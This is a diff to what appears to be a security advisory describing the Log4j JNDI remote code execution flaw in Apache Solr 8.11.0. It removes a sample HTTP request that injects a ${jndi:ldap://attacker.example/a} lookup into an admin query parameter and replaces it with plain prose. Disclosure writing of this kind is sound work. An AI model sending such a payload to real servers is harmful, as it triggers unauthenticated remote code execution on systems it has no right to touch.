@@ -16,14 +16,8 @@ attacker-controlled LDAP or RMI server, which returns a serialized Java class
 that Log4j loads and executes. This gives unauthenticated remote code
 execution as the Solr process user.
 
-Solr's admin handler logs query parameters at INFO level, so a request such
-as:
-
-```
-GET /solr/admin/cores?action=${jndi:ldap://attacker.example/a}
-```
-
-is sufficient to trigger the lookup.
+Solr's admin handler logs query parameters at INFO level, so unauthenticated
+request parameters reach Log4j.
 
 ## Affected Service
 - **Service:** Apache Solr 8.11.0
